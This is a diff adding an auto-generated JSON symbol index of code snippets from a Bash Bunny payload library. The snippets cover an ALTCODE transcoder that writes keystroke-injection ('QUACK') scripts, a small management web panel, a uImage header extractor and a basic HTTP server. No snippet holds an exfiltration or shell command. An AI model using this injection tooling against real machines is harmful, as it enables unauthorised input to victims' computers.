+        "peekOfCode": "\t\t\t\tline = ''.join(line.split('0a')[:-1])\n\t\t\t\tline = ''.join(line.split('0d')[:-1])\n\t\t\tline = binascii.unhexlify(line)\n\t\t\tif len(line) > 0:\n\t\t\t\tansiDict[str(binascii.hexlify(line))] = str(altcode)\n\t\t\taltcode += 1\ndef main(SWITCH_POSITION):\n\tlocalDir = '/root/udisk/payloads/' + SWITCH_POSITION + '/'\n\tlineCount = 0\n\twith open(localDir + 'payload.txt', 'a+') as payload:",
+        "detail": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "documentation": {}
+    },
+    {
+        "label": "\t\t\t\tline",
+        "kind": 5,
+        "importPath": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "description": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "peekOfCode": "\t\t\t\tline = ''.join(line.split('0d')[:-1])\n\t\t\tline = binascii.unhexlify(line)\n\t\t\tif len(line) > 0:\n\t\t\t\tansiDict[str(binascii.hexlify(line))] = str(altcode)\n\t\t\taltcode += 1\ndef main(SWITCH_POSITION):\n\tlocalDir = '/root/udisk/payloads/' + SWITCH_POSITION + '/'\n\tlineCount = 0\n\twith open(localDir + 'payload.txt', 'a+') as payload:\n\t\twith open(localDir + 'img.txt', 'rb') as img:",
+        "detail": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "documentation": {}
+    },
+    {
+        "label": "\t\t\tline",
+        "kind": 5,
+        "importPath": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "description": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "peekOfCode": "\t\t\tline = binascii.unhexlify(line)\n\t\t\tif len(line) > 0:\n\t\t\t\tansiDict[str(binascii.hexlify(line))] = str(altcode)\n\t\t\taltcode += 1\ndef main(SWITCH_POSITION):\n\tlocalDir = '/root/udisk/payloads/' + SWITCH_POSITION + '/'\n\tlineCount = 0\n\twith open(localDir + 'payload.txt', 'a+') as payload:\n\t\twith open(localDir + 'img.txt', 'rb') as img:\n\t\t\tfor line in img:",
+        "detail": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "documentation": {}
+    },
+    {
+        "label": "\t\t\t\tansiDict[str(binascii.hexlify(line))]",
+        "kind": 5,
+        "importPath": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "description": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "peekOfCode": "\t\t\t\tansiDict[str(binascii.hexlify(line))] = str(altcode)\n\t\t\taltcode += 1\ndef main(SWITCH_POSITION):\n\tlocalDir = '/root/udisk/payloads/' + SWITCH_POSITION + '/'\n\tlineCount = 0\n\twith open(localDir + 'payload.txt', 'a+') as payload:\n\t\twith open(localDir + 'img.txt', 'rb') as img:\n\t\t\tfor line in img:\n\t\t\t\tlineCount += 1\n\t\t\t\tindex = 0",
+        "detail": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "documentation": {}
+    },
+    {
+        "label": "\tlocalDir",
+        "kind": 5,
+        "importPath": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "description": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "peekOfCode": "\tlocalDir = '/root/udisk/payloads/' + SWITCH_POSITION + '/'\n\tlineCount = 0\n\twith open(localDir + 'payload.txt', 'a+') as payload:\n\t\twith open(localDir + 'img.txt', 'rb') as img:\n\t\t\tfor line in img:\n\t\t\t\tlineCount += 1\n\t\t\t\tindex = 0\n\t\t\t\twhile index < len(line)-1:\n\t\t\t\t\tc = line[index]\n\t\t\t\t\tif c in string.printable:",
+        "detail": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "documentation": {}
+    },
+    {
+        "label": "\tlineCount",
+        "kind": 5,
+        "importPath": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "description": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "peekOfCode": "\tlineCount = 0\n\twith open(localDir + 'payload.txt', 'a+') as payload:\n\t\twith open(localDir + 'img.txt', 'rb') as img:\n\t\t\tfor line in img:\n\t\t\t\tlineCount += 1\n\t\t\t\tindex = 0\n\t\t\t\twhile index < len(line)-1:\n\t\t\t\t\tc = line[index]\n\t\t\t\t\tif c in string.printable:\n\t\t\t\t\t\t#normal character",
+        "detail": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "documentation": {}
+    },
+    {
+        "label": "\t\t\t\tindex",
+        "kind": 5,
+        "importPath": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "description": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "peekOfCode": "\t\t\t\tindex = 0\n\t\t\t\twhile index < len(line)-1:\n\t\t\t\t\tc = line[index]\n\t\t\t\t\tif c in string.printable:\n\t\t\t\t\t\t#normal character\n\t\t\t\t\t\tpayload.write('QUACK STRING'+c+'\\n')\n\t\t\t\t\t\tindex += 1\n\t\t\t\t\telse:\n\t\t\t\t\t\t#altcode\n\t\t\t\t\t\tkey = binascii.hexlify(line[index:index+3])",
+        "detail": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "documentation": {}
+    },
+    {
+        "label": "\t\t\t\t\tc",
+        "kind": 5,
+        "importPath": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "description": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "peekOfCode": "\t\t\t\t\tc = line[index]\n\t\t\t\t\tif c in string.printable:\n\t\t\t\t\t\t#normal character\n\t\t\t\t\t\tpayload.write('QUACK STRING'+c+'\\n')\n\t\t\t\t\t\tindex += 1\n\t\t\t\t\telse:\n\t\t\t\t\t\t#altcode\n\t\t\t\t\t\tkey = binascii.hexlify(line[index:index+3])\n\t\t\t\t\t\tpayload.write('QUACK ALTCODE '+ansiDict[key]+'\\n')\n\t\t\t\t\t\tindex += 3",
+        "detail": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "documentation": {}
+    },
+    {
+        "label": "\t\t\t\t\t\tkey",
+        "kind": 5,
+        "importPath": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "description": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "peekOfCode": "\t\t\t\t\t\tkey = binascii.hexlify(line[index:index+3])\n\t\t\t\t\t\tpayload.write('QUACK ALTCODE '+ansiDict[key]+'\\n')\n\t\t\t\t\t\tindex += 3\n\t\t\t\tpayload.write('QUACK ENTER\\n')\n\t\tpayload.write('LED FINISH')\n\tprint lineCount, 'lines processed'\nif __name__ == '__main__':\n\tgetDict(sys.argv[1])\n\tmain(sys.argv[1])",
+        "detail": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "documentation": {}
+    },
+    {
+        "label": "index",
+        "kind": 6,
+        "importPath": "payloads.library.general.BashBunny_Manager.panel.sites.index",
+        "description": "payloads.library.general.BashBunny_Manager.panel.sites.index",
+        "peekOfCode": "class index:\n    def GET(self, handler):\n        ret = open('templates/main.tpl').read()\n        ret = ret.replace('{{ title }}', 'Payloads').replace('{{ content }}', self.generatePayloadList())\n        ret = ret.replace('{{ buttons }}', '''\n              <button class=\"btn btn-sm btn-outline-secondary\" id=\"upload_button\">\n                <span data-feather=\"upload\"></span> Import\n              </button>\n              <form id=\"upload_form\" method=\"POST\" enctype=\"multipart/form-data\" style=\"display:none\">\n                <input type=\"hidden\" name=\"action\" value=\"upload\">",
+        "detail": "payloads.library.general.BashBunny_Manager.panel.sites.index",
+        "documentation": {}
+    },
+    {
+        "label": "languages",
+        "kind": 6,
+        "importPath": "payloads.library.general.BashBunny_Manager.panel.sites.languages",
+        "description": "payloads.library.general.BashBunny_Manager.panel.sites.languages",
+        "peekOfCode": "class languages:\n    def GET(self, handler):\n        ret = open('templates/main.tpl').read()\n        ret = ret.replace('{{ title }}', 'Languages').replace('{{ content }}', self.generateLanguageList())\n        ret = ret.replace('{{ buttons }}', '''\n              <button class=\"btn btn-sm btn-outline-secondary\" id=\"upload_button\">\n                <span data-feather=\"upload\"></span> Import\n              </button>\n              <form id=\"upload_form\" method=\"POST\" enctype=\"multipart/form-data\" style=\"display:none\">\n                <input type=\"hidden\" name=\"action\" value=\"upload\">",
+        "detail": "payloads.library.general.BashBunny_Manager.panel.sites.languages",
+        "documentation": {}
+    },
+    {
+        "label": "shutdown",
+        "kind": 6,
+        "importPath": "payloads.library.general.BashBunny_Manager.panel.sites.shutdown",
+        "description": "payloads.library.general.BashBunny_Manager.panel.sites.shutdown",
+        "peekOfCode": "class shutdown:    \n    def POST(self, data, handler):\n        handler.send_response(200)\n        handler.send_header('Content-type', 'text/html')\n        handler.end_headers()\n        handler.wfile.write('Shutting down...')\n        os.unlink('run.lock')\n        subprocess.call(['./shutdown.sh'])\n        return None",
+        "detail": "payloads.library.general.BashBunny_Manager.panel.sites.shutdown",
+        "documentation": {}
+    },
+    {
+        "label": "users",
+        "kind": 6,
+        "importPath": "payloads.library.general.BashBunny_Manager.panel.sites.users",
+        "description": "payloads.library.general.BashBunny_Manager.panel.sites.users",
+        "peekOfCode": "class users:\n    def GET(self, handler):\n        ret = open('templates/main.tpl').read()\n        ret = ret.replace('{{ title }}', 'Users').replace('{{ content }}', self.generateUserList())\n        ret = ret.replace('{{ buttons }}', '''\n              <form method=\"POST\">\n                <input type=\"hidden\" name=\"action\" value=\"add_user\">\n                <input type=\"text\" name=\"user\" placeholder=\"Username\">\n                <input type=\"password\" name=\"pass\" placeholder=\"Password\">\n                <button class=\"btn btn-sm btn-outline-secondary\" type=\"submit\">",
+        "detail": "payloads.library.general.BashBunny_Manager.panel.sites.users",
+        "documentation": {}
+    },
+    {
+        "label": "FileNotFoundError",
+        "kind": 6,
+        "importPath": "payloads.library.general.BashBunny_Manager.panel.main",
+        "description": "payloads.library.general.BashBunny_Manager.panel.main",
+        "peekOfCode": "class FileNotFoundError(Exception):\n    pass\nclass MethodNotAllowedError(Exception):\n    pass\nclass web_server(BaseHTTPRequestHandler):\n    def process(self, method='GET'):\n        self.server_version = 'Bashbunny-Manager'\n        self.sys_version = '0.1' if DEBUG else ''\n        self.path = self.path.replace('..', '')\n        py_path = os.path.join('sites', '{0}.py'.format(self.path[1:]))",
+        "detail": "payloads.library.general.BashBunny_Manager.panel.main",
+        "documentation": {}
+    },
+    {
+        "label": "MethodNotAllowedError",
+        "kind": 6,
+        "importPath": "payloads.library.general.BashBunny_Manager.panel.main",
+        "description": "payloads.library.general.BashBunny_Manager.panel.main",
+        "peekOfCode": "class MethodNotAllowedError(Exception):\n    pass\nclass web_server(BaseHTTPRequestHandler):\n    def process(self, method='GET'):\n        self.server_version = 'Bashbunny-Manager'\n        self.sys_version = '0.1' if DEBUG else ''\n        self.path = self.path.replace('..', '')\n        py_path = os.path.join('sites', '{0}.py'.format(self.path[1:]))\n        content_type = 'text/html'\n        body = None",
+        "detail": "payloads.library.general.BashBunny_Manager.panel.main",
+        "documentation": {}
+    },
+    {
+        "label": "web_server",
+        "kind": 6,
+        "importPath": "payloads.library.general.BashBunny_Manager.panel.main",
+        "description": "payloads.library.general.BashBunny_Manager.panel.main",
+        "peekOfCode": "class web_server(BaseHTTPRequestHandler):\n    def process(self, method='GET'):\n        self.server_version = 'Bashbunny-Manager'\n        self.sys_version = '0.1' if DEBUG else ''\n        self.path = self.path.replace('..', '')\n        py_path = os.path.join('sites', '{0}.py'.format(self.path[1:]))\n        content_type = 'text/html'\n        body = None\n        # Authentication\n        authenticated = False",
+        "detail": "payloads.library.general.BashBunny_Manager.panel.main",
+        "documentation": {}
+    },
+    {
+        "label": "DEBUG",
+        "kind": 5,
+        "importPath": "payloads.library.general.BashBunny_Manager.panel.main",
+        "description": "payloads.library.general.BashBunny_Manager.panel.main",
+        "peekOfCode": "DEBUG = True\nclass FileNotFoundError(Exception):\n    pass\nclass MethodNotAllowedError(Exception):\n    pass\nclass web_server(BaseHTTPRequestHandler):\n    def process(self, method='GET'):\n        self.server_version = 'Bashbunny-Manager'\n        self.sys_version = '0.1' if DEBUG else ''\n        self.path = self.path.replace('..', '')",
+        "detail": "payloads.library.general.BashBunny_Manager.panel.main",
+        "documentation": {}
+    },
+    {
+        "label": "PORT",
+        "kind": 5,
+        "importPath": "payloads.library.general.BashBunny_Manager.panel.main",
+        "description": "payloads.library.general.BashBunny_Manager.panel.main",
+        "peekOfCode": "PORT = int(sys.argv[1]) if len(sys.argv) >= 2 else 8337\ntry:\n    server = HTTPServer(('', PORT), web_server)\n    open('run.lock', 'w+').write('run')\n    while os.path.isfile('run.lock'):\n        server.handle_request()\nexcept KeyboardInterrupt:\n\tserver.socket.close()",
+        "detail": "payloads.library.general.BashBunny_Manager.panel.main",
+        "documentation": {}
+    },
+    {
+        "label": "InHeader",
+        "kind": 5,
+        "importPath": "payloads.library.general.FICBunny.UIBEX",
+        "description": "payloads.library.general.FICBunny.UIBEX",
+        "peekOfCode": "InHeader = InFileHan.read(64)\nLogFile.write(u\"[{a}]: Header loaded. Checking Magic.\\n\".format(a=datetime.datetime.utcnow()))\ntry:\n    assert InHeader[:4] == \"'\\x05\\x19V\"\nexcept AssertionError:\n    LogFile.write(u\"[{a}]: Assertion failed, magic is not correct.\\n\".format(a=datetime.datetime.utcnow()))\n    sys.exit(1)\nLogFile.write(u\"[{a}]: Magic verified.\\n\".format(a=datetime.datetime.utcnow()))\nInHedC = f\"{InHeader}1\"\nInHedC = InHedC[:64]",
+        "detail": "payloads.library.general.FICBunny.UIBEX",
+        "documentation": {}
+    },
+    {
+        "label": "InHedC",
+        "kind": 5,
+        "importPath": "payloads.library.general.FICBunny.UIBEX",
+        "description": "payloads.library.general.FICBunny.UIBEX",
+        "peekOfCode": "InHedC = f\"{InHeader}1\"\nInHedC = InHedC[:64]\n# Blanking CRC.\nInHedC = InHedC[:4] + \"\\x00\\x00\\x00\\x00\" + InHedC[8::]\n# Verify CRC.\nHeaderCRC = struct.pack(\">i\",binascii.crc32(InHedC))\ntry:\n    assert HeaderCRC == InHeader[4:8:]\nexcept AssertionError:\n    LogFile.write(u\"[{a}]: Assertion failed, CRC fail to verify. Calculated CRC: {b} Stored CRC: {c}\\n\".format(a=datetime.datetime.utcnow(),b=base64.b16encode(HeaderCRC),c=base64.b16encode(InHeader[4:8:])))",
+        "detail": "payloads.library.general.FICBunny.UIBEX",
+        "documentation": {}
+    },
+    {
+        "label": "InHedC",
+        "kind": 5,
+        "importPath": "payloads.library.general.FICBunny.UIBEX",
+        "description": "payloads.library.general.FICBunny.UIBEX",
+        "peekOfCode": "InHedC = InHedC[:64]\n# Blanking CRC.\nInHedC = InHedC[:4] + \"\\x00\\x00\\x00\\x00\" + InHedC[8::]\n# Verify CRC.\nHeaderCRC = struct.pack(\">i\",binascii.crc32(InHedC))\ntry:\n    assert HeaderCRC == InHeader[4:8:]\nexcept AssertionError:\n    LogFile.write(u\"[{a}]: Assertion failed, CRC fail to verify. Calculated CRC: {b} Stored CRC: {c}\\n\".format(a=datetime.datetime.utcnow(),b=base64.b16encode(HeaderCRC),c=base64.b16encode(InHeader[4:8:])))\n    sys.exit(1)",
+        "detail": "payloads.library.general.FICBunny.UIBEX",
+        "documentation": {}
+    },
+    {
+        "label": "InHedC",
+        "kind": 5,
+        "importPath": "payloads.library.general.FICBunny.UIBEX",
+        "description": "payloads.library.general.FICBunny.UIBEX",
+        "peekOfCode": "InHedC = InHedC[:4] + \"\\x00\\x00\\x00\\x00\" + InHedC[8::]\n# Verify CRC.\nHeaderCRC = struct.pack(\">i\",binascii.crc32(InHedC))\ntry:\n    assert HeaderCRC == InHeader[4:8:]\nexcept AssertionError:\n    LogFile.write(u\"[{a}]: Assertion failed, CRC fail to verify. Calculated CRC: {b} Stored CRC: {c}\\n\".format(a=datetime.datetime.utcnow(),b=base64.b16encode(HeaderCRC),c=base64.b16encode(InHeader[4:8:])))\n    sys.exit(1)\nLogFile.write(u\"[{a}]: Header CRC: {b}\\n\".format(a=datetime.datetime.utcnow(),b=base64.b16encode(HeaderCRC)))\nLogFile.write(u\"[{a}]: Searching for uImage data.\\n\".format(a=datetime.datetime.utcnow()))",
+        "detail": "payloads.library.general.FICBunny.UIBEX",
+        "documentation": {}
+    },
+    {
+        "label": "HeaderCRC",
+        "kind": 5,
+        "importPath": "payloads.library.general.FICBunny.UIBEX",
+        "description": "payloads.library.general.FICBunny.UIBEX",
+        "peekOfCode": "HeaderCRC = struct.pack(\">i\",binascii.crc32(InHedC))\ntry:\n    assert HeaderCRC == InHeader[4:8:]\nexcept AssertionError:\n    LogFile.write(u\"[{a}]: Assertion failed, CRC fail to verify. Calculated CRC: {b} Stored CRC: {c}\\n\".format(a=datetime.datetime.utcnow(),b=base64.b16encode(HeaderCRC),c=base64.b16encode(InHeader[4:8:])))\n    sys.exit(1)\nLogFile.write(u\"[{a}]: Header CRC: {b}\\n\".format(a=datetime.datetime.utcnow(),b=base64.b16encode(HeaderCRC)))\nLogFile.write(u\"[{a}]: Searching for uImage data.\\n\".format(a=datetime.datetime.utcnow()))\n# Grab length and verify data.\nImageLength = struct.unpack(\">i\",InHeader[12:16])[0]",
+        "detail": "payloads.library.general.FICBunny.UIBEX",
+        "documentation": {}
+    },
+    {
+        "label": "ImageLength",
+        "kind": 5,
+        "importPath": "payloads.library.general.FICBunny.UIBEX",
+        "description": "payloads.library.general.FICBunny.UIBEX",
+        "peekOfCode": "ImageLength = struct.unpack(\">i\",InHeader[12:16])[0]\nImageData = InFileHan.read(ImageLength)\nLogFile.write(u\"[{a}]: uImage data loaded.\\n\".format(a=datetime.datetime.utcnow()))\n# Verify CRC. \nDataCRC = struct.pack(\">i\",binascii.crc32(ImageData))\ntry:\n    assert DataCRC == InHeader[24:28:]\nexcept AssertionError:\n    LogFile.write(u\"[{a}]: Assertion failed, CRC fail to verify. Calculated CRC: {b} Stored CRC: {c}\\n\".format(a=datetime.datetime.utcnow(),b=base64.b16encode(DataCRC),c=base64.b16encode(InHeader[24:28:])))\n    sys.exit(1)",
+        "detail": "payloads.library.general.FICBunny.UIBEX",
+        "documentation": {}
+    },
+    {
+        "label": "ImageData",
+        "kind": 5,
+        "importPath": "payloads.library.general.FICBunny.UIBEX",
+        "description": "payloads.library.general.FICBunny.UIBEX",
+        "peekOfCode": "ImageData = InFileHan.read(ImageLength)\nLogFile.write(u\"[{a}]: uImage data loaded.\\n\".format(a=datetime.datetime.utcnow()))\n# Verify CRC. \nDataCRC = struct.pack(\">i\",binascii.crc32(ImageData))\ntry:\n    assert DataCRC == InHeader[24:28:]\nexcept AssertionError:\n    LogFile.write(u\"[{a}]: Assertion failed, CRC fail to verify. Calculated CRC: {b} Stored CRC: {c}\\n\".format(a=datetime.datetime.utcnow(),b=base64.b16encode(DataCRC),c=base64.b16encode(InHeader[24:28:])))\n    sys.exit(1)\nLogFile.write(u\"[{a}]: Data CRC: {b}\\n\".format(a=datetime.datetime.utcnow(),b=base64.b16encode(DataCRC)))",
+        "detail": "payloads.library.general.FICBunny.UIBEX",
+        "documentation": {}
+    },
+    {
+        "label": "DataCRC",
+        "kind": 5,
+        "importPath": "payloads.library.general.FICBunny.UIBEX",
+        "description": "payloads.library.general.FICBunny.UIBEX",
+        "peekOfCode": "DataCRC = struct.pack(\">i\",binascii.crc32(ImageData))\ntry:\n    assert DataCRC == InHeader[24:28:]\nexcept AssertionError:\n    LogFile.write(u\"[{a}]: Assertion failed, CRC fail to verify. Calculated CRC: {b} Stored CRC: {c}\\n\".format(a=datetime.datetime.utcnow(),b=base64.b16encode(DataCRC),c=base64.b16encode(InHeader[24:28:])))\n    sys.exit(1)\nLogFile.write(u\"[{a}]: Data CRC: {b}\\n\".format(a=datetime.datetime.utcnow(),b=base64.b16encode(DataCRC)))\nLogFile.write(u\"[{a}]: Both CRC's have been verified. Extraction complete.\\n\".format(a=datetime.datetime.utcnow()))\nLogFile.write(u\"[{a}]: Here is header information:\\n\".format(a=datetime.datetime.utcnow()))\nHeaderDataT = [",
+        "detail": "payloads.library.general.FICBunny.UIBEX",
+        "documentation": {}
+    },
+    {
+        "label": "HeaderDataT",
+        "kind": 5,
+        "importPath": "payloads.library.general.FICBunny.UIBEX",
+        "description": "payloads.library.general.FICBunny.UIBEX",
+        "peekOfCode": "HeaderDataT = [\n    (u\"Image Header Magic Number\", base64.b16encode(InHeader[:4]).decode()),\n    (u\"Image Header CRC Checksum\", base64.b16encode(InHeader[4:8]).decode()),\n    (u\"Image Creation Timestamp\", base64.b16encode(InHeader[8:12]).decode()),\n    (u\"Image Data Size\", base64.b16encode(InHeader[12:16]).decode()),\n    (u\"Data Load Address\", base64.b16encode(InHeader[16:20]).decode()),\n    (u\"Entry Point Address\", base64.b16encode(InHeader[20:24]).decode()),\n    (u\"Image Data CRC Checksum\", base64.b16encode(InHeader[24:28]).decode()),\n    (u\"Operating System\", ord(InHeader[28])),\n    (u\"CPU architecture\", ord(InHeader[29])),",
+        "detail": "payloads.library.general.FICBunny.UIBEX",
+        "documentation": {}
+    },
+    {
+        "label": "OutFileName",
+        "kind": 5,
+        "importPath": "payloads.library.general.FICBunny.UIBEX",
+        "description": "payloads.library.general.FICBunny.UIBEX",
+        "peekOfCode": "OutFileName = \"./uImage-{a}.img\".format(a=int(time.time()//1))\nLogFile.write(u\"[{a}]: Writing image to {OutFileName}\\n\".format(a=datetime.datetime.utcnow(),OutFileName=OutFileName))\nOutFileHan = open(OutFileName,u\"wb\")\nOutBytes = OutFileHan.write(InHeader + ImageData)\nLogFile.write(u\"[{a}]: Written {OutBytes} bytes.\\n\".format(a=datetime.datetime.utcnow(),OutBytes=OutBytes))\nLogFile.write(u\"[{a}]: -------------------------------------------------------\\n\".format(a=datetime.datetime.utcnow()))\nLogFile.close()\nsys.exit(0)",
+        "detail": "payloads.library.general.FICBunny.UIBEX",
+        "documentation": {}
+    },
+    {
+        "label": "OutFileHan",
+        "kind": 5,
+        "importPath": "payloads.library.general.FICBunny.UIBEX",
+        "description": "payloads.library.general.FICBunny.UIBEX",
+        "peekOfCode": "OutFileHan = open(OutFileName,u\"wb\")\nOutBytes = OutFileHan.write(InHeader + ImageData)\nLogFile.write(u\"[{a}]: Written {OutBytes} bytes.\\n\".format(a=datetime.datetime.utcnow(),OutBytes=OutBytes))\nLogFile.write(u\"[{a}]: -------------------------------------------------------\\n\".format(a=datetime.datetime.utcnow()))\nLogFile.close()\nsys.exit(0)",
+        "detail": "payloads.library.general.FICBunny.UIBEX",
+        "documentation": {}
+    },
+    {
+        "label": "OutBytes",
+        "kind": 5,
+        "importPath": "payloads.library.general.FICBunny.UIBEX",
+        "description": "payloads.library.general.FICBunny.UIBEX",
+        "peekOfCode": "OutBytes = OutFileHan.write(InHeader + ImageData)\nLogFile.write(u\"[{a}]: Written {OutBytes} bytes.\\n\".format(a=datetime.datetime.utcnow(),OutBytes=OutBytes))\nLogFile.write(u\"[{a}]: -------------------------------------------------------\\n\".format(a=datetime.datetime.utcnow()))\nLogFile.close()\nsys.exit(0)",
+        "detail": "payloads.library.general.FICBunny.UIBEX",
+        "documentation": {}
+    },
+    {
+        "label": "RequestServer",
+        "kind": 6,
+        "importPath": "payloads.library.general.Windows_NIC_Sharing.server",
+        "description": "payloads.library.general.Windows_NIC_Sharing.server",
+        "peekOfCode": "class RequestServer(BaseHTTPRequestHandler):\n    def _set_headers(self):\n        self.send_response(200, \"ok\")\n        self.send_header('Content-type', 'text/plain')\n        self.protocol_version = 'HTTP/1.1'\n    def do_GET(self):\n        self.send_response(200, \"ok\")\n        self.send_header(\"Content-type\", \"text/plain\")\n        self.end_headers()\n        try:",
+        "detail": "payloads.library.general.Windows_NIC_Sharing.server",
+        "documentation": {}
+    },
+    {
+        "label": "run",
+        "kind": 2,
+        "importPath": "payloads.library.general.Windows_NIC_Sharing.server",
+        "description": "payloads.library.general.Windows_NIC_Sharing.server",
+        "peekOfCode": "def run(server_class=HTTPServer, handler_class=RequestServer, port=80):\n    server_address = ('', port)\n    httpd = server_class(server_address, handler_class)\n    while IS_RUNNING:\n        httpd.handle_request()\nif __name__ == '__main__':\n    run()",
+        "detail": "payloads.library.general.Windows_NIC_Sharing.server",
+        "documentation": {}
+    },
+    {
+        "label": "IS_RUNNING",
+        "kind": 5,
+        "importPath": "payloads.library.general.Windows_NIC_Sharing.server",
+        "description": "payloads.library.general.Windows_NIC_Sharing.server",
+        "peekOfCode": "IS_RUNNING = True\nabspath = os.path.abspath(__file__)\nCURR_DIR = os.path.dirname(abspath)\nos.chdir(CURR_DIR)\nclass RequestServer(BaseHTTPRequestHandler):\n    def _set_headers(self):\n        self.send_response(200, \"ok\")\n        self.send_header('Content-type', 'text/plain')\n        self.protocol_version = 'HTTP/1.1'\n    def do_GET(self):",
+        "detail": "payloads.library.general.Windows_NIC_Sharing.server",
+        "documentation": {}
+    },
+    {
+        "label": "abspath",
+        "kind": 5,
+        "importPath": "payloads.library.general.Windows_NIC_Sharing.server",
+        "description": "payloads.library.general.Windows_NIC_Sharing.server",
+        "peekOfCode": "abspath = os.path.abspath(__file__)\nCURR_DIR = os.path.dirname(abspath)\nos.chdir(CURR_DIR)\nclass RequestServer(BaseHTTPRequestHandler):\n    def _set_headers(self):\n        self.send_response(200, \"ok\")\n        self.send_header('Content-type', 'text/plain')\n        self.protocol_version = 'HTTP/1.1'\n    def do_GET(self):\n        self.send_response(200, \"ok\")",
+        "detail": "payloads.library.general.Windows_NIC_Sharing.server",
+        "documentation": {}
+    },
+    {
+        "label": "CURR_DIR",
+        "kind": 5,
+        "importPath": "payloads.library.general.Windows_NIC_Sharing.server",
+        "description": "payloads.library.general.Windows_NIC_Sharing.server",
+        "peekOfCode": "CURR_DIR = os.path.dirname(abspath)\nos.chdir(CURR_DIR)\nclass RequestServer(BaseHTTPRequestHandler):\n    def _set_headers(self):\n        self.send_response(200, \"ok\")\n        self.send_header('Content-type', 'text/plain')\n        self.protocol_version = 'HTTP/1.1'\n    def do_GET(self):\n        self.send_response(200, \"ok\")\n        self.send_header(\"Content-type\", \"text/plain\")",
+        "detail": "payloads.library.general.Windows_NIC_Sharing.server",
+        "documentation": {}
+    }
+]
